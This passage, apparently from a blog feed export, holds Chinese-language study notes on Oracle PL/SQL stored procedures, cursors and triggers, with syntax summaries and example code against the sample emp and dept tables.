<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--调用示例： </span><br><span class="line">DECLARE  </span><br><span class="line">    Var VARCHAR(32); </span><br><span class="line">BEGIN </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user1&#39;, 30); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;女&#39;, age &#x3D;&gt; 20); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h2><h3 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] PROCEDURE Procedure_name </span><br><span class="line">[ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type, </span><br><span class="line">   argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] </span><br><span class="line">&#123; IS | AS &#125; </span><br><span class="line"> &lt;类型.变量的说明&gt;   </span><br><span class="line">BEGIN </span><br><span class="line"> &lt;执行部分&gt; </span><br><span class="line">EXCEPTION </span><br><span class="line"> &lt;可选的异常错误处理程序&gt; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例 ：删除指定员工记录 </span><br><span class="line">CREATE OR REPLACE PROCEDURE DelEmp </span><br><span class="line">  (v_empno IN emp.empno%TYPE)  </span><br><span class="line">AS </span><br><span class="line">	No_result EXCEPTION; </span><br><span class="line">BEGIN </span><br><span class="line">	DELETE FROM emp WHERE empno&#x3D;v_empno; </span><br><span class="line">	IF SQL%NOTFOUND THEN </span><br><span class="line">    	RAISE no_result; </span><br><span class="line">    END IF; </span><br><span class="line">       DBMS_OUTPUT.PUT_LINE(&#39;编码为&#39;||v_empno||&#39;的员工已被除名!&#39;);</span><br><span class="line">	EXCEPTION </span><br><span class="line">		WHEN no_result THEN  </span><br><span class="line">			DBMS_OUTPUT.PUT_LINE(&#39;你需要的数据不存在!&#39;); </span><br><span class="line">		WHEN OTHERS THEN </span><br><span class="line">      		DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); </span><br><span class="line">END DelEmp;</span><br></pre></td></tr></table></figure>
<h3 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h3><p>存储过程建立完成后，只要通过授权，用户就可以在SQLPLUS 、ORACLE开发工具或第三方开发工具中来调用运行。ORACLE 使用EXECUTE 语句来实现对存储过程的调用</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC[UTE]  Procedure_name( parameter1, parameter2…)</span><br></pre></td></tr></table></figure>
<h4 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--sqlplus调用示例</span><br><span class="line">SQL&gt; EXECUTE DelEmp(10)； </span><br><span class="line">SQL&gt; EXECUTE DelEmp(:a)；   </span><br><span class="line"> </span><br><span class="line">SQL&gt; variable a varchar2(20) </span><br><span class="line">SQL&gt; execute :a:&#x3D;fun_stu(&#39;BA&#39;);</span><br><span class="line">--例：计算指定部门的工资总和，并统计其中的职工数量。 </span><br><span class="line">--创建存储过程</span><br><span class="line">CREATE OR REPLACE PROCEDURE proc_demo </span><br><span class="line">	(Dept_no NUMBER DEFAULT 10 , Sal_sum OUT NUMBER, </span><br><span class="line">	Emp_count OUT NUMBER) </span><br><span class="line">IS </span><br><span class="line">BEGIN </span><br><span class="line">	SELECT SUM(sal), COUNT(*) INTO sal_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no; </span><br><span class="line">	EXCEPTION </span><br><span class="line">     	WHEN NO_DATA_FOUND THEN  </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(&#39;你需要的数据不存在!&#39;); </span><br><span class="line">     	WHEN OTHERS THEN  </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); </span><br><span class="line"> END proc_demo;</span><br><span class="line">--调用存储过程: </span><br><span class="line">DECLARE </span><br><span class="line">	V_num NUMBER; </span><br><span class="line">  	V_sum NUMBER(8, 2); </span><br><span class="line">BEGIN </span><br><span class="line"> 	Proc_demo(30, v_sum, v_num); </span><br><span class="line">  	DBMS_OUTPUT.PUT_LINE(&#39;30号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); </span><br><span class="line">  	Proc_demo(sal_sum &#x3D;&gt; v_sum, emp_count &#x3D;&gt; v_num); </span><br><span class="line">  	DBMS_OUTPUT.PUT_LINE(&#39;10号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="查询、删除过程和函数"><a href="#查询、删除过程和函数" class="headerlink" title="查询、删除过程和函数"></a>查询、删除过程和函数</h2><ul>
<li><p>在SQL*PLUS 中，可以用DESCRIBE 命令查看过程的名字及其参数</p>
<p><code>DESCRIBE Procedure_name;</code><br>(desc table; 用于列出指定表或视图中的所有列)</p>
</li>
<li><p>可以使用DROP语句删除函数和过程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--删除函数</span><br><span class="line">DROP FUNCTION function_name;</span><br><span class="line">--删除过程</span><br><span class="line">DROP PROCEDURE proceduer_name;</span><br></pre></td></tr></table></figure>
<h2 id="授权执行权给相关的用户或角色"><a href="#授权执行权给相关的用户或角色" class="headerlink" title="授权执行权给相关的用户或角色"></a>授权执行权给相关的用户或角色</h2></li>
<li><p>如果调式正确的存储过程没有进行授权，那就只有建立者本人才可以运行。所以作为应用系统的一部分的存储过程也必须进行授权才能达到要求。</p>
</li>
<li><p>可以用GRANT命令来进行存储过程的运行授权</p>
</li>
</ul>
<h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例</span><br><span class="line">GRANT EXECUTE ON Proc_demo TO user| role | PUBLIC  </span><br><span class="line">	[WITH GRANT OPTION]</span><br></pre></td></tr></table></figure>
<h2 id="与过程相关的内置数据字典"><a href="#与过程相关的内置数据字典" class="headerlink" title="与过程相关的内置数据字典"></a>与过程相关的内置数据字典</h2><table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">USER_PROCEDURES</td>
<td align="left">查询用户所有的子程序信息</td>
</tr>
<tr>
<td align="left">USER_SOURCE</td>
<td align="left">查看用户所有对象的源代码</td>
</tr>
<tr>
<td align="left">USER_OBJECTS</td>
<td align="left">查看用户创建的过程对象</td>
</tr>
<tr>
<td align="left">USER_ERRORS</td>
<td align="left">查看用户所有的子程序错误信息</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT object_name,authid,object_type FROM user_procedures;</span><br><span class="line">--AUTHID DEFINER （定义者权限）：指编译存储对象的所有者。也是默认权限模式 </span><br><span class="line">--AUTHID CURRENT_USER（调用者权限）：指拥有当前会话权限的模式 </span><br><span class="line"></span><br><span class="line">SELECT * FROM user_source WHERE name&#x3D;&#39;MLDN_PROC&#39; ;</span><br><span class="line"></span><br><span class="line">SELECT object_name,created,timestamp,status FROM user_objects </span><br><span class="line">WHERE object_type&#x3D;&#39;PROCEDURE&#39; OR object_type&#x3D;&#39;FUNCTION&#39;; </span><br><span class="line">--status：该字段有两个取值：VALID（有效），INVALID（无效）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsql游标</title>
    <url>/2019/12/17/Oracle/plsql%E6%B8%B8%E6%A0%87/</url>
    <content><![CDATA[<h1 id="plsql游标"><a href="#plsql游标" class="headerlink" title="plsql游标"></a>plsql游标</h1><h2 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h2><table>
<thead>
<tr>
<th align="left">SQL语句</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">非查询语句</td>
<td align="left">隐式的</td>
</tr>
<tr>
<td align="left">结果是单行的查询语句</td>
<td align="left">隐式或显示的</td>
</tr>
<tr>
<td align="left">结果是多行的查询语句</td>
<td align="left">显示的</td>
</tr>
</tbody></table>
<a id="more"></a>
<h3 id="显示游标"><a href="#显示游标" class="headerlink" title="显示游标"></a>显示游标</h3><h4 id="定义游标："><a href="#定义游标：" class="headerlink" title="定义游标："></a>定义游标：</h4><p>就是定义一个游标名，以及与其相对应的SELECT 语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CURSOR cursor_name IS  select_statement;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>游标声明部分是唯一可以出现在模块声明部分的步骤，其他三个<br>步骤都在执行或异常处理部分中</li>
<li>游标名是标识符，所以也有作用域，并且必须在使用前进行说明</li>
<li>任何SELECT语句都是合法的，但是SELECT …INTO语句是非法的</li>
<li>在声明部分的末尾声明游标</li>
</ul>
<h4 id="打开游标："><a href="#打开游标：" class="headerlink" title="打开游标："></a>打开游标：</h4><p>就是执行游标所对应的SELECT语句，将其查询结果放入工作区，并且指针指向工作区的首部，标识游标结果集合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPEN cursor_name</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>PL/SQL 程序不能用OPEN 语句重复打开同一个游标</p>
<h4 id="提取游标："><a href="#提取游标：" class="headerlink" title="提取游标："></a>提取游标：</h4><p>就是检索结果集合中的数据行，放入指定的输出变量中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FETCH cursor_name INTO &#123;variable_list | record_variable &#125;;</span><br></pre></td></tr></table></figure>
<h4 id="关闭游标："><a href="#关闭游标：" class="headerlink" title="关闭游标："></a>关闭游标：</h4><p>当提取和处理完游标结果集合数据后，应及时关闭游标，以释放该游标所占用的系统资源，并使该游标的工作区变成无效，不能再使用FETCH 语句取其中数据。关闭后的游标可以使用OPEN 语句重新打开。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLOSE cursor_name;</span><br></pre></td></tr></table></figure>
<h4 id="游标属性"><a href="#游标属性" class="headerlink" title="游标属性"></a>游标属性</h4><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%FOUND</td>
<td align="left">布尔型属性，当最近一次读记录时成功返回,则值为TRUE</td>
</tr>
<tr>
<td align="left">%NOTFOUND</td>
<td align="left">布尔型属性，与%FOUND相反</td>
</tr>
<tr>
<td align="left">%ISOPEN</td>
<td align="left">布尔型属性，当游标已打开时返回 TRUE</td>
</tr>
<tr>
<td align="left">%ROWCOUNT</td>
<td align="left">数字型属性，返回已从游标中读取的记录数</td>
</tr>
</tbody></table>
<h3 id="隐式游标"><a href="#隐式游标" class="headerlink" title="隐式游标"></a>隐式游标</h3><p><strong>说明：</strong></p>
<ul>
<li>显式游标主要是用于对查询语句的处理，尤其是在查询结果为多条记录的情况下；而对于非查询语句，如修改、删除操作，则由ORACLE 系统自动地为这些操作设置游标并创建其工作区，这些由系统隐含创建的游标称为隐式游标</li>
<li>隐式游标的名字为SQL，这是由ORACLE 系统定义的。对于隐式游标的操作，如定义、打开、取值及关闭操作，都由ORACLE 系统自动地完成，无需用户进行处理。用户只能通过隐式游标的相关属性，来完成相应的操作。</li>
<li>在隐式游标的工作区中，所存放的数据是最新处理的一条SQL 语句所包含的数据（与用户自定义的显示游标无关的）。</li>
<li>INSERT, UPDATE, DELETE, SELECT INTO语句中不必明确定义游标</li>
</ul>
<h4 id="游标属性-1"><a href="#游标属性-1" class="headerlink" title="游标属性"></a>游标属性</h4><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%FOUND</td>
<td align="left">布尔型属性,至少有一行被INSERT,DELETE或UPDATE时返回TRUE。</td>
</tr>
<tr>
<td align="left">%NOTFOUND</td>
<td align="left">布尔型属性，与%FOUND相反</td>
</tr>
<tr>
<td align="left">%ISOPEN</td>
<td align="left">布尔型属性，当游标已打开时返回 TRUE布尔型属性, 取值总是FALSE。SQL命令执行完毕立即关闭隐式游标。</td>
</tr>
<tr>
<td align="left">%ROWCOUNT</td>
<td align="left">数字型属性，返回已从游标中读取的记录数</td>
</tr>
</tbody></table>
<p><strong>注：</strong></p>
<ul>
<li>与最近的sql语句（update,insert,delete,select）发生交互，当最近的一条sql语句没有涉及任何行的时候，则返回相应的值。</li>
<li>例如要update一行数据时，如果没有找到，就可以作相应操作。</li>
</ul>
<h3 id="游标变量"><a href="#游标变量" class="headerlink" title="游标变量"></a>游标变量</h3><p><strong>举例：</strong></p>
<p>声明两个强类型定义游标变量和一个弱类型游标变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line">	TYPE deptrecord IS RECORD( </span><br><span class="line">		Deptno dept.deptno%TYPE, </span><br><span class="line">		Dname dept.deptno%TYPE, </span><br><span class="line">		Loc dept.loc%TYPE ); </span><br><span class="line"> 	TYPE deptcurtype IS REF CURSOR RETURN dept%ROWTYPE; </span><br><span class="line"> 	TYPE deptcurtyp1 IS REF CURSOR RETURN deptrecord; </span><br><span class="line"> 	TYPE curtype IS REF CURSOR; </span><br><span class="line"> 	Dept_c1 deptcurtype; </span><br><span class="line"> 	Dept_c2 deptcurtyp1; </span><br><span class="line"> 	Cv curtype;</span><br></pre></td></tr></table></figure>
<h4 id="游标变量操作"><a href="#游标变量操作" class="headerlink" title="游标变量操作"></a>游标变量操作</h4><p>游标变量操作也包括打开、提取和关闭三个步骤</p>
<h4 id="打开游标变量-："><a href="#打开游标变量-：" class="headerlink" title="打开游标变量 ："></a>打开游标变量 ：</h4><p>打开游标变量时使用的是OPEN…FOR 语句。</p>
<p>格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPEN &#123;cursor_variable_name | :host_cursor_variable_name&#125; </span><br><span class="line">	FOR select_statement;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>cursor_variable_name为游标变量</li>
<li>host_cursor_variable_name为PL/SQL主机环境（如OCI: ORACLE Call Interface，Pro*c 程序等）中声明的游标变量。</li>
<li>OPEN…FOR 语句可以在关闭当前的游标变量之前重新打开游标变量，而不会导致CURSOR_ALREAD_OPEN异常错误。</li>
<li>新打开游标变量时，前一个查询的内存处理区将被释放</li>
</ul>
<h4 id="提取游标变量数据-："><a href="#提取游标变量数据-：" class="headerlink" title="提取游标变量数据 ："></a>提取游标变量数据 ：</h4><p>使用FETCH语句提取游标变量结果集合中的数据。格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FETCH &#123;cursor_variable_name | :host_cursor_variable_name&#125; </span><br><span class="line">	INTO &#123;variable [, variable]…| record_variable&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">cursor_variable_name</td>
<td align="left">游标变量名称</td>
</tr>
<tr>
<td align="left">host_cursor_variable_name</td>
<td align="left">宿主游标变量名称</td>
</tr>
<tr>
<td align="left">variable</td>
<td align="left">普通变量名称</td>
</tr>
<tr>
<td align="left">record_variable</td>
<td align="left">记录变量名称</td>
</tr>
</tbody></table>
<h4 id="关闭游标变量-："><a href="#关闭游标变量-：" class="headerlink" title="关闭游标变量 ："></a>关闭游标变量 ：</h4><p>CLOSE语句关闭游标变量，格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLOSE &#123;cursor_variable_name | :host_cursor_variable_name&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>cursor_variable_name和host_cursor_variable_name分别为游标变量和宿主游标变量名称</li>
<li>如果应用程序试图关闭一个未打开的游标变量，则将导致INVALID_CURSOR异常错误。</li>
</ul>
<h3 id="游标类型"><a href="#游标类型" class="headerlink" title="游标类型"></a>游标类型</h3><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">静态游标</td>
<td align="left">显式游标和隐式游标称为静态游标，因为在使用他们之前，游标的定义已经完成，不能再更改。</td>
</tr>
<tr>
<td align="left">动态游标</td>
<td align="left">游标在声明时没有设定，在打开时可以对其进行修改。分为强类型游标和弱类型游标。</td>
</tr>
<tr>
<td align="left">强类型动态游标</td>
<td align="left">在声明变量时使用return关键字定义游标的返回类型</td>
</tr>
<tr>
<td align="left">弱类型动态游标</td>
<td align="left">在声明变量时不使用return关键字定义游标的返回类型</td>
</tr>
</tbody></table>
<h4 id="游标变量应用举例"><a href="#游标变量应用举例" class="headerlink" title="游标变量应用举例"></a>游标变量应用举例</h4><h5 id="强类型参照游标变量类型"><a href="#强类型参照游标变量类型" class="headerlink" title="强类型参照游标变量类型"></a>强类型参照游标变量类型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line"> 	TYPE emp_job_rec IS RECORD( </span><br><span class="line">  		Employee_id emp.empno%TYPE, </span><br><span class="line">  		Employee_name emp.ename%TYPE, </span><br><span class="line">  		Job_title emp.job%TYPE); </span><br><span class="line"> 	TYPE emp_job_refcur_type IS REF CURSOR RETURN emp_job_rec; </span><br><span class="line"> 	Emp_refcur emp_job_refcur_type ; </span><br><span class="line"> 	Emp_job emp_job_rec;</span><br><span class="line">BEGIN </span><br><span class="line"> 	OPEN emp_refcur FOR  SELECT empno, ename, job FROM emp ORDER BY deptno; </span><br><span class="line">	FETCH emp_refcur INTO emp_job; </span><br><span class="line">	WHILE emp_refcur%FOUND LOOP </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(emp_job.employee_id||&#39;: &#39;</span><br><span class="line">                         ||emp_job.employee_name</span><br><span class="line">                         ||&#39; is a &#39;</span><br><span class="line">                         ||emp_job.job_title); </span><br><span class="line">	FETCH emp_refcur INTO emp_job; </span><br><span class="line">	END LOOP; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h5 id="弱类型参照游标变量类型"><a href="#弱类型参照游标变量类型" class="headerlink" title="弱类型参照游标变量类型"></a>弱类型参照游标变量类型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line"> 	Type refcur_t IS REF CURSOR; </span><br><span class="line"> 	Refcur refcur_t; </span><br><span class="line"> 	TYPE sample_rec_type IS RECORD ( </span><br><span class="line">  		Id number, </span><br><span class="line"> 		 Description VARCHAR2 (30) ); </span><br><span class="line"> 	sample sample_rec_type; </span><br><span class="line"> 	selection varchar2(1) :&#x3D; UPPER (SUBSTR (&#39;&amp;tab&#39;, 1, 1));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsql触发器</title>
    <url>/2019/12/17/Oracle/plsql%E8%A7%A6%E5%8F%91%E5%99%A8/</url>
    <content><![CDATA[<h1 id="plsql触发器"><a href="#plsql触发器" class="headerlink" title="plsql触发器"></a>plsql触发器</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>触发器在数据库里以独立的对象存储，它与存储过程不同的是，<ul>
<li>存储过程通过其它程序来启动运行或直接启动运行</li>
<li>触发器是由一个<strong>事件</strong>来启动运行</li>
</ul>
</li>
<li>触发器是当某个事件发生时自动地隐式运行。<ul>
<li>触发器<strong>不能接收参数</strong>。</li>
<li>运行触发器就叫<strong>触发</strong>或<strong>点火</strong>（firing）</li>
</ul>
</li>
<li>ORACLE中事件指的是对数据库的表进行的INSERT、UPDATE及DELETE操作或对视图进行类似的操作。</li>
<li>ORACLE将触发器的功能扩展到了触发ORACLE，如数据库的启动与关闭等。<a id="more"></a>
<h2 id="触发器类型"><a href="#触发器类型" class="headerlink" title="触发器类型"></a>触发器类型</h2></li>
</ul>
<p>主要的触发器有<strong>三种</strong>：</p>
<ul>
<li>DML触发器<ul>
<li>ORACLE可以在DML语句进行触发</li>
<li>可以在DML操作前或操作后进行触发</li>
<li>可以对每个行或语句操作上进行触发</li>
</ul>
</li>
<li>替代触发器<ul>
<li>由于在ORACLE里，不能直接对由两个以上的表建立的视图进行操作。所以给出了替代触发器。<ul>
<li>它是ORACLE专门为进行视图操作的一种处理方法</li>
</ul>
</li>
</ul>
</li>
<li>系统（用户事件）触发器<ul>
<li>它可以在ORACLE数据库系统的事件中进行触发<ul>
<li>如ORACLE系统的启动与关闭等。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="触发器组成"><a href="#触发器组成" class="headerlink" title="触发器组成"></a>触发器组成</h2><ul>
<li>触发事件<ul>
<li>即在何种情况下触发TRIGGER<ul>
<li>例如：INSERT, UPDATE, DELETE</li>
</ul>
</li>
</ul>
</li>
<li>触发时间<ul>
<li>即该TRIGGER 是在触发事件发生之前（BEFORE）还是之后(AFTER)触发<ul>
<li>也就是触发事件和该TRIGGER 的操作顺序</li>
</ul>
</li>
</ul>
</li>
<li>触发器本身<ul>
<li>即该TRIGGER 被触发之后的目的和意图，正是触发器本身要做的事情<ul>
<li>例如：PL/SQL 块。</li>
</ul>
</li>
</ul>
</li>
<li>触发频率<ul>
<li>说明触发器内定义的动作被执行的次数<ul>
<li>即语句级(STATEMENT)触发器和行级(ROW)触发器<ul>
<li>语句级(STATEMENT)触发器<ul>
<li>是指当某触发事件发生时，该触发器只执行一次</li>
</ul>
</li>
<li>行级(ROW)触发器<ul>
<li>是指当某触发事件发生时，对受到该操作影响的每一行数据，触发器都单独执行一次</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] TRIGGER trigger_name </span><br><span class="line">   	&#123;BEFORE | AFTER &#125; </span><br><span class="line">   	&#123;INSERT | DELETE | UPDATE [OF column [, column …]]&#125; </span><br><span class="line">ON [schema.] table_name  </span><br><span class="line"> 	[REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] </span><br><span class="line"> 	[FOR EACH ROW ] </span><br><span class="line"> 	[WHEN condition] </span><br><span class="line"> trigger_body;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>BEFORE 和AFTER<ul>
<li>指出触发器的触发时序分别为前触发和后触发方式</li>
<li>前触发是在执行触发事件之前触发当前所创建的触发器</li>
<li>后触发是在执行触发事件之后触发当前所创建的触发器</li>
</ul>
</li>
<li>FOR EACH ROW<ul>
<li>说明触发器为行触发器</li>
<li>行触发器和语句触发器的区别表现在<ul>
<li>行触发器要求当一个DML语句操走影响数据库中的多行数据时，对于其中的每个数据行，只要它们符合触发约束条件，均激活一次触发器</li>
<li>语句触发器将整个语句操作作为触发事件，当它符合约束条件时，激活一次触发器</li>
</ul>
</li>
<li>当省略FOR EACH ROW 选项时<ul>
<li>BEFORE 和AFTER 触发器为语句触发器，</li>
<li>INSTEAD OF 触发器则为行触发器</li>
</ul>
</li>
</ul>
</li>
<li>REFERENCING<ul>
<li>说明相关名称</li>
<li>在行触发器的PL/SQL块和WHEN 子句中可以使用相关名称参照当前的新、旧列值，默认的相关名称分别为OLD和NEW。</li>
<li>触发器的PL/SQL块中应用相关名称时，必须在它们之前加冒号(:)，但在WHEN子句中则不能加冒号。</li>
</ul>
</li>
<li>WHEN<ul>
<li>说明触发约束条件</li>
<li>Condition 为一个逻辑表达时，其中必须包含相关名称，而不能包含查询语句，也不能调用PL/SQL 函数</li>
<li>WHEN 子句指定的触发约束条件<ul>
<li><strong>只能</strong>用在<strong>BEFORE 和AFTER 行触发器</strong>中</li>
<li><strong>不能</strong>用在<strong>INSTEAD OF 行触发器和其它类型的触发器</strong>中</li>
</ul>
</li>
</ul>
</li>
<li>当一个基表被修改( INSERT, UPDATE, DELETE)时要执行的存储过程，执行时根据其所依附的基表改动而自动触发因此与应用程序无关，用<strong>数据库触发器</strong>可以保证数据的一致性和完整性。</li>
</ul>
<h3 id="每张表最多可创建12种触发器"><a href="#每张表最多可创建12种触发器" class="headerlink" title="每张表最多可创建12种触发器"></a>每张表最多可创建12种触发器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BEFORE INSERT </span><br><span class="line">BEFORE INSERT FOR EACH ROW </span><br><span class="line">AFTER INSERT </span><br><span class="line">AFTER INSERT FOR EACH ROW </span><br><span class="line">BEFORE UPDATE </span><br><span class="line">BEFORE UPDATE FOR EACH ROW </span><br><span class="line">AFTER UPDATE </span><br><span class="line">AFTER UPDATE FOR EACH ROW </span><br><span class="line">BEFORE DELETE </span><br><span class="line">BEFORE DELETE FOR EACH ROW </span><br><span class="line">AFTER DELETE </span><br><span class="line">AFTER DELETE FOR EACH ROW</span><br></pre></td></tr></table></figure>
<h2 id="触发器执行顺序"><a href="#触发器执行顺序" class="headerlink" title="触发器执行顺序"></a>触发器执行顺序</h2><ul>
<li>执行 BEFORE语句级触发器</li>
<li>对于受语句影响的每一行：<ul>
<li>执行 BEFORE行级触发器</li>
<li>执行 DML语句</li>
<li>执行 AFTER行级触发器</li>
</ul>
</li>
<li>执行 AFTER语句级触发器</li>
</ul>
<h2 id="创建DML触发器"><a href="#创建DML触发器" class="headerlink" title="创建DML触发器"></a>创建DML触发器</h2><ul>
<li>触发器名与过程名和包的名字不一样，它是单独的名字空间，因而触发器名可以和表或过程有相同的名字</li>
<li>但在一个模式中触发器名不能相同</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例： 建立一个触发器, 当职工表 emp 表被删除一条记录时，把被删除记录写到职工表删除日志表中去。  </span><br><span class="line">CREATE OR REPLACE TRIGGER del_emp  </span><br><span class="line">	BEFORE DELETE ON scott.emp FOR EACH ROW </span><br><span class="line">BEGIN </span><br><span class="line">	--将修改前数据插入到日志记录表 del_emp ,以供监督使用。 </span><br><span class="line">	INSERT INTO emp_his(deptno,empno,ename,job,mgr,sal,comm,hiredate)VALUES</span><br><span class="line">	(:old.deptno,:old.empno,:old.ename,:old.job,:old.mgr,:old.sal, :old.comm,:old.hiredate); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="触发器的限制"><a href="#触发器的限制" class="headerlink" title="触发器的限制"></a>触发器的限制</h3><ul>
<li>CREATE TRIGGER语句文本的字符长度不能超过32KB<ul>
<li>(由于大小受到限制也不能使用long,blob这样的大变量.如果实在是有复杂的逻辑,要弄个很复杂的触发器,可以通过procedure或function实现一部分功能,然后调用)</li>
</ul>
</li>
<li>触发器体内的SELECT 语句只能为SELECT … INTO …结构，或者为定义游标所使用的SELECT 语句</li>
<li>触发器中不能使用数据库事务控制语句 COMMIT， ROLLBACK, SVAEPOINT 语句</li>
<li>由触发器所调用的过程或函数也不能使用数据库事务控制语句</li>
<li>触发器中不能使用LONG, LONG RAW 类型</li>
<li>触发器内可以参照LOB类型列的列值，但不能通过 :NEW 修改LOB列中的数据<ul>
<li>(LOB类型：将信息文件（十进制、二进制）、图像甚至音频信息采用数据库作为保存载体时，就需要使用lob类型数据。每个LOB可以有2GB。)</li>
</ul>
</li>
<li><ul>
<li>(LOB类型：将信息文件（十进制、二进制）、图像甚至音频信息采用数据库作为保存载体时，就需要使用lob类型数据。每个LOB可以有2GB。)</li>
</ul>
</li>
</ul>
<h3 id="行级别触发器中的相关标识符"><a href="#行级别触发器中的相关标识符" class="headerlink" title="行级别触发器中的相关标识符"></a>行级别触发器中的相关标识符</h3><p>当触发器被触发时，要使用被插入、更新或删除的记录中的列值，有时要使用操作前、后列的值 ，可以使用：</p>
<ul>
<li>:NEW 修饰符访问操作完成后列的值</li>
<li>:OLD 修饰符访问操作完成前列的值</li>
</ul>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">INSERT</th>
<th align="left">UPDATE</th>
<th align="left">DELETE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NEW</td>
<td align="left">有效</td>
<td align="left">有效</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">OLD</td>
<td align="left">NULL</td>
<td align="left">有效</td>
<td align="left">有效</td>
</tr>
</tbody></table>
